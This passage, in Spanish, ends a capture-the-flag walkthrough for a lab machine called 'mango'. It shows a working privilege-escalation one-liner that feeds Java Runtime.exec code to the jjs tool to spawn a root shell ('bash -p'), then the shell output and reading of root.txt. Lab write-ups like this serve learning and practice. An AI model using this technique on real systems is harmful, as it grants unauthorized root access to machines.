Este pequeño script de bash funciona como un pipe que recibe instrucciones vía argumentos, es por eso que cuando lo ejecutamos la primera vez, parece un tanto atorado porque no vemos el salto de linea entre instrucción e instrucción.

``` text
admin@mango:/home/admin$ echo "Java.type('java.lang.Runtime').getRuntime().exec('/bin/bash -pc \$@|bash\${IFS}-p _ echo bash -p <$(tty) >$(tty) 2>$(tty)').waitFor()" | /usr/lib/jvm/java-11-openjdk-amd64/bin/jjs
Warning: The jjs tool is planned to be removed from a future JDK release
jjs> Java.type('java.lang.Runtime').getRuntime().exec('/bin/bash -pc $@|bash${IFS}-p _ echo bash -p </dev/pts/0 >/dev/pts/0 2>/dev/pts/0').waitFor()
bash-4.4# uid=4000000000(admin) gid=1001(admin) euid=0(root) groups=1001(admin)
bash-4.4# bash-4.4# bash-4.4# reset
```

Para reparar esto, actualizamos las variables ejecutando un `reset` sobre bash que nos ayude a tener una mejor interacción con esta terminal:

``` text
Interrupt set to control-C (^C).
bash-4.4# ls
user.txt
bash-4.4# id
uid=4000000000(admin) gid=1001(admin) euid=0(root) groups=1001(admin)
```

# root.txt

``` text
bash-4.4# cat /root/root.txt
<omitido>
```

---

Gracias por llegar hasta aquí, hasta la próxima!
